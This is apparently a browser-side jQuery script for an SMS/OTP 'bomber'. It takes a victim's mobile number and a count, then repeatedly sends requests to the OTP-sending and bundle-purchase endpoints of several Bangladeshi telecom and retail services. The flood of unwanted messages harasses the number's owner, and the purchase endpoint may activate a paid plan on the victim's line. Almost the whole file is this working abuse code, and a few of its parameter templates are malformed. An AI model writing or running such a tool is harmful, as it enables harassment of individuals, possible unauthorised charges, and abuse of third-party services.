// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
// Removing credit won't make you a cool programmer xD

$(document).ready(() => {

    $(document).on('click', '#send', function (e) {        
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val();
        if (amount > 0 && mobile.length == 11) {
            var c = 0;

            const APIS = [
                {
                    method: "POST",
                    url: `https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation`,
                    body: {"payment_mode":"mobile_balance","longevity":3,"voice":25,"data":2560,"fourg":0,"bioscope":0,"sms":0,"mca":0,"msisdn":"{mobile}","price":78.87,"bundle_id":408890,"is_login":false}
                },
                {
                    method: 'POST',
                    url: "https://api.bongo-solutions.com/auth/api/login/send-otp",
                    body: `msisdn=88${mobile}&operator=all`
                },
                {
                    method: 'GET',
                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
                },
                {
                    method: 'GET',
                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                },
                {
                    url: "https://web-api.binge.buzz/api/v3/otp/send",
                    method: "POST",
                    body: `phone=$88{mobile}`
                }

            ];

            while (c < amount) {
                APIS.forEach(API => {
                    $.ajax(API);
                    c += 1;
                });
            }
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Processing Bombing Request...");


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Invalid Number or Amount is null");
        }
    });
})
